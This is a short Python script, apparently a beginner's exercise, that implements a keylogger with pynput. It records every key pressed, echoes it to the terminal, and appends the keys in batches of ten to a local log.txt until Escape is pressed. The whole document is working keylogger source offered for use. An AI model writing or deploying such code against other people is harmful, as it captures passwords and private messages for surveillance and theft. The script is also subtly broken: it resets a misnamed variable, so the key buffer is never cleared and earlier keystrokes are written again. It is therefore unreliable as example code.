#This program is a keylogger that uses pynput to take the user keys and store them. After they are store there is a for loop that 
#will write them in to a file that will be update every X amount of keys the person would like them to have

import pynput

count = 0
keys = []

from pynput.keyboard import Key, Listener

#Function will take press key sotre into the keys array
#Also will print out key pressed live into terminal
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f" '{key}' pressed")

    #Every ten keys this will update the file
    if count >= 10:
        #Reset count 0 and empty array
        count = 0
        write_file(keys)
        key = []

#Take the keys from the array and write them into the log.txt file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            #Format the log.txt file to make it more readable to the user inside of the file
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#To stop the keylogger the user must press the escape key
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listerner:
    listerner.join()

